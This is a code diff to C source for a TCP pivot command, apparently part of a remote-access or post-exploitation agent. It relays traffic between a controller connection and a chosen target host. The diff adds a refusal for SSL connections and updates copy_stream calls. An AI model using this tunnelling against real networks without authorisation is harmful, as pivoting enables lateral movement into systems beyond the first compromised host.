@@ -26,6 +26,7 @@
 #include "common.h"
 #include "parser.h"
 #include "tcp.h"
+#include "stream.h"
 
 #include "pivot.h"
 
@@ -46,7 +47,6 @@ void do_tcp_pivot(Parser *p)
     struct sockaddr_in sa;
     _stub_pivot_thread_params *thread_args_1 = NULL;
     _stub_pivot_thread_params *thread_args_2 = NULL;
-    DWORD success = 0;
     HANDLE hHeap = GetProcessHeap();
     HANDLE hThread_1 = INVALID_HANDLE_VALUE;
     HANDLE hThread_2 = INVALID_HANDLE_VALUE;
@@ -58,6 +58,16 @@ void do_tcp_pivot(Parser *p)
         parser_close(p);
         return;
     }
+
+    // Disable this command if SSL is enabled.
+    // This is tricky to implement so I'm leaving it for later.
+#ifndef TICK_FEATURES_NO_CRYPTO
+    if (p->use_ssl) {
+        LOG("TODO implement do_tcp_pivot() on SSL connections\n");
+        parser_error(p, "operation not yet supported on encrypted connections");
+        return;
+    }
+#endif
 
     // Connect to the target IP and port.
     sock = create_socket(AF_INET);
@@ -154,7 +164,7 @@ DWORD WINAPI _stub_copy_socket_stream(LPVOID lpParam)
     HeapFree(GetProcessHeap(), 0, lpParam);
 
     // Copy the socket streams.
-    copy_stream(src, dst, -1);
+    copy_stream(src, STREAM_SOCKET, dst, STREAM_SOCKET, -1);
 
     // Close all the sockets and exit.
     shutdown(src, 2);
@@ -180,6 +190,16 @@ void do_tcp_pivot(Parser *p)
         parser_close(p);
         return;
     }
+
+    // Disable this command if SSL is enabled.
+    // This is tricky to implement so I'm leaving it for later.
+#ifndef TICK_FEATURES_NO_CRYPTO
+    if (p->use_ssl) {
+        LOG("TODO implement do_tcp_pivot() on SSL connections\n");
+        parser_error(p, "operation not yet supported on encrypted connections");
+        return;
+    }
+#endif
 
     // Connect to the target IP and port.
     sock = create_socket(AF_INET);
@@ -214,12 +234,12 @@ void do_tcp_pivot(Parser *p)
         if (fork() == 0) {
 
             // The first process will handle the source to destination data.
-            copy_stream(p->fd, sock, -1);
+            copy_stream(p->fd, STREAM_SOCKET, sock, STREAM_SOCKET, -1);
 
         } else {
 
             // The second process will handle the destination to source data.
-            copy_stream(sock, p->fd, -1);
+            copy_stream(sock, STREAM_SOCKET, p->fd, STREAM_SOCKET, -1);
 
         }
 
